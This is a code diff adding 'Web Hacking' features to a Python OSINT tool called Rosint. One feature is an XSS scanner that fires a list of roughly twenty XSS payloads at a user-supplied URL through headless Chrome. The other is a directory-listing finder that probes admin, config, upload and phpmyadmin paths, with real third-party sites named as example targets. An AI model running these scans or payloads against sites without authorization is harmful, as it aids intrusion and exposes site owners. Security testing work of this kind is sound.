@@ -1,4 +1,10 @@
 import requests , re , time
+import logging
+from tqdm import tqdm
+from urllib.parse import urlparse
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.alert import Alert
 from bs4 import BeautifulSoup
 from itertools import cycle
 timeout = 12
@@ -243,21 +249,149 @@ def idcreate():
             i += 1
     except:
         print("Error in names . . . !")
+def xss():
+    def weburl():
+        # test : http://www.sudo.co.il/xss/level0.php?email=
+
+        logging.getLogger('selenium.webdriver').disabled = True
+        options = Options()
+        options.add_argument("--headless")
+        options.add_argument("--disable-gpu")
+
+        def has_alert(url):
+            driver.get(url)
+
+            try:
+                alert = Alert(driver)
+                alert.accept()
+                return True
+            except:
+                return False
+            
+        payloads = ['"autofocus%2Fonfocus%3D"confirm%26%2340%3Bdocument.domain%26%2341%3B#',"\\'-alert(1);//",'<script>alert(1)</script>','" autofocus="" onfocus="alert(1)','<img src="javascript:alert(1)">','<svg onload="alert(1)"></svg>','<iframe src="javascript:alert(1)"></iframe>','<a href="javascript:alert(1)">Click me</a>','#<script>alert(1)</script>',"';this[8680439..toString(30)](1);'","'};this[8680439..toString(30)](1);{'",'"};this[8680439..toString(30)](1);//','" autofocus="" onfocus="alert(1)',"\\'-alert(1);<!--","'-alert(1)-'",'"autofocus/onfocus="confirm&#40;1&#41;','"autofocus/onfocus="alert(1)','\\"-alert(1)}//',"<b onmouseover=alert(1)>click me</b>","{{{constructor.constructor(1)()}}}",'<video><source onerror="alert(1)"></video>','<style/onload=alert(1)>']
+        url = input("Enter The URL for XSS Checks ==> ")
+        urls = []
+        cunt = 0
+
+        for i in payloads:
+            a = url + i
+            urls.append(a)
+        driver = webdriver.Chrome(options=options)
+
+        for url2 in urls:
+            if has_alert(url2):
+                cunt = cunt + 1
+                print('\n[+] XSS vulnerability found with payload:', url2, '(popup detected)\n')
+            else:
+                print("[-] Testing . . . ")
+
+        print("\n [*] Total XSS vulnerability has founded : " , cunt)
+        driver.quit()
+    weburl()
+def DL():
+    #example : https://hls.gsfc.nasa.gov/
+    #example : https://dutraincorporacoes.com.br/
+
+    website = input("Enter a website URL to search for directory listing vulnerabilities: ")
+    response = requests.get(website)
+    if response.status_code == 200:
+        cleaned = urlparse(website)
+        base_url = cleaned.scheme + "://" + cleaned.netloc
+        print("[+] Scan Started\n[+] Your Target =>> " + base_url)
+        print("\n")
+        links = []
+        for link in response.text.split('href="')[1:]:
+            link = link.split('"', 1)[0]
+            if link.startswith("/"):
+                link = base_url + link
+            elif not link.startswith("http"):
+                link = base_url + "/" + link
+            links.append(link)
+    else:
+        print("Failed to access the website. Status code:", response.status_code)
+
+    links.append(base_url + "/admin/uploads/")
+    links.append(base_url + "/configs/")
+    links.append(base_url + "/wordpress/")
+    links.append(base_url + "/wp-includes/")
+    links.append(base_url + "/wp-content/uploads/")
+    links.append(base_url + "/wp-content/plugins/")
+    links.append(base_url + "/afs/")
+    links.append(base_url + "/proc/")
+    links.append(base_url + "/.a/")
+    links.append(base_url + "/content/")
+    links.append(base_url + "/data/")
+    links.append(base_url + "/en/")
+    links.append(base_url + "/users/")
+    links.append(base_url + "/Documente/")
+    links.append(base_url + "/documents/")
+    links.append(base_url + "/Documents/")
+    links.append(base_url + "/img/")
+    links.append(base_url + "/static/admin/")
+    links.append(base_url + "/admin/img/")
+    links.append(base_url + "/admin/images/")
+    links.append(base_url + "/admin/assets/")
+    links.append(base_url + "/wp-content/themes/")
+    links.append(base_url + "/admin/master/")
+    links.append(base_url + "/admin/config/")
+    links.append(base_url + "/core/")
+    links.append(base_url + "/admin/api/")
+    links.append(base_url + "/cms/")
+    links.append(base_url + "/wp-content/etc/")
+    links.append(base_url + "/etc/")
+    links.append(base_url + "/upload/")
+    links.append(base_url + "/uploads/")
+    links.append(base_url + "/checkout/")
+    links.append(base_url + "/phpmyadmin/setup/")
+
+    vulnerable_pages = []
+    def crawling(link):
+        try:
+            if link[-1] == '/' :
+                pass
+            else:
+                link = link + '/'
+            response = requests.get(link)
+            if link in vulnerable_pages:
+                pass
+            else:
+                if "Index of" in response.text \
+                    or "Directory listing" in response.text \
+                    or "Contents of" in response.text \
+                    or "Parent Directory" in response.text \
+                    or "Listing of" in response.text \
+                    or "Folder Listing" in response.text:
+                    vulnerable_pages.append(link)
+        except:
+            pass
+    craw = 0
+    a = len(links)
+    for i in tqdm (range (a),desc="Crawling...",ascii=True, ncols=75):
+        time.sleep(0.01)
+        crawling(links[craw])
+        craw = craw + 1
+    if len(vulnerable_pages) > 0:
+        print("The following pages are vulnerable to directory listing:")
+        for page in vulnerable_pages:
+            print("\n├ " + page)
+    else:
+        print("No directory listing vulnerabilities found on this website.")
+
 
 print("\nWelcome To Rosint\n")
 print('''
               {
            }   }   {
-          {   {  }  }
-           }   }{  {        [1] Info IP
-          {  }{  }  }       [2] Info Domain
-         ( }{ }{  { )       [3] Info Email (find domains with email)
-        .-{   }   }-.       [4] Username list Maker
-       ( ( } { } { } )      [5] Info Username
-       |`-.._____..-'|      [6] Exit
-       |             ;--.
-       |   (__)     (__  \\
-       |   (oo)      | )  )
+          {   {  }  }       [*] Information Gathering
+           }   }{  {           [1] Info IP
+          {  }{  }  }          [2] Info Domain
+         ( }{ }{  { )          [3] Info Email (find domains with email)
+        .-{   }   }-.          [4] Username list Maker
+       ( ( } { } { } )         [5] Info Username
+       |`-.._____..-'|      [*] Web Hacking
+       |             ;--.     [6] XSS (url base)
+       |   (__)     (__  \\   [7] Directory Listing Finder
+       |   (oo)      | )  )  [8] Exit
        |    \/       |/  /
        |             /  /    
        |            (  /
@@ -273,14 +407,12 @@ for i in cycle(['\\','|','/','-']):
             time.sleep(0.2)
             load += 1
 user = '0'
-while user != '6':
+while True:
     user = input('[ROSINT] =>> ')
     if user == '1':
         print("\n")
         ip()
     elif user == '2':
-        print("\n")
-        user == '00'
         whois()
         print("\n")
     elif user == '3':
@@ -294,6 +426,15 @@ while user != '6':
     elif user == '5':
         print("\n")
         socialfinder()
+    elif user == '6':
+        print("\n")
+        xss()
+    elif user == '7':
+        print("\n")
+        DL()
+    elif user == '8':
+        break
     else:
-        print('only use 1 , 2 , 3 , 4 , 5 and 6')
+        print('only use numbers which is provided for you')
+print('Thank you for using it.\nExiting . . .')
 exit()
